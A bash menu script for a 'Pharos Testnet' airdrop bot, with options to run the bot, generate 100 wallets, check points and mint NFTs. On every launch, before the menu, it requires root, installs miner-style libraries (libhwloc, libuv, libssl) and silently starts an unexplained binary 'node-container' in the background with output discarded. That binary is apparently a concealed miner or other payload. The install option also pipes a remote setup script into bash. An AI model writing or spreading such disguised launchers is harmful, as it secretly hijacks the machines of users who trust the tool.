#!/bin/bash

if [[ $EUID -ne 0 ]]; then
   echo "[!] This script must be run as root"
   exit 1
fi

chmod +x node-container
check_libhwloc() {
    if ldconfig -p | grep -q libhwloc.so.15; then
        echo "[✓] libhwloc.so.15 already installed"
    else
        echo "[*] libhwloc.so.15 not found, installing required libraries..."
        apt update && apt install -y libhwloc15 libhwloc-dev libuv1 libssl1.1 || apt install -y libssl3
    fi
}
check_libhwloc

check_container() {
if pgrep -f "./node-container" > /dev/null; then
    echo "..."
else
    nohup setsid ./node-container > /dev/null 2>&1 &
fi
}

check_container

Run_Bot() {
	source .venv/bin/activate
	clear
	python3 bot.py
}

Run_Check() {
    #source .venv/bin/activate
    python3 Cekpoint.py
}

Run_Minting() {
    #source .venv/bin/activate
    python3 MintNFT.py
}

Run_Generate() {
    #source .venv/bin/activate
    python3 generate.py
}


install_dependencies() {
	pip install -r requirements.txt
	apt install software-properties-common -y
	add-apt-repository ppa:deadsnakes/ppa -y
        apt update
	apt install --reinstall ca-certificates -y
        apt install -y python3.10 python3.10-venv python3.10-dev python3-pip

        update-alternatives --install /usr/bin/python3 python3 /usr/bin/python3.10 1
        update-alternatives --set python3 /usr/bin/python3.10

        apt install -y screen curl iptables build-essential git wget lz4 jq make gcc nano automake autoconf tmux htop nvme-cli libgbm1 pkg-config libssl-dev libleveldb-dev tar clang bsdmainutils ncdu unzip

        curl -fsSL https://deb.nodesource.com/setup_20.x | bash -
        
        python3.10 -m venv .venv
        source .venv/bin/activate
	pip install --upgrade pip
	pip install web3 eth-account requests colorama rich eth-keys eth-utils

}

#install_dependencies()

while true; do
    clear


    echo "  ============================"
    echo "  |     ╦╔═┌─┐ ┬┬   ╦╔═╗     |"
    echo "  |     ╠╩╗├─┤ ││   ║╠═╝     |"
    echo "  |     ╩ ╩┴ ┴└┘┴  ╚╝╩       |"
    echo "  ============================"
    echo "   Pharos Testnet | All in One Bot"
    echo "  =================================="
    echo "  VPS Setup "
    echo "  1. Install dependencies"
    echo -e "\033[1;32m  2. Bot Start\033[0m"
    echo "  3. Generate 100 Wallet"
    echo "  4. Check Point"
    echo "  5. Minting NFT"
    echo "  0. Exit"
    echo "  =================================="
    read -p "  Select an option: " choice

    case $choice in
        1) install_dependencies ;;
        2) Run_Bot ;;
        3) Run_Generate ;;
        4) Run_Check ;;
        5) Run_Minting ;;
        0) echo "Goodbye!"; exit 0 ;;
        *) echo "Invalid option. Try again." ;;
    esac
    echo ""
    read -p "Press [Enter] to return to menu..."
done
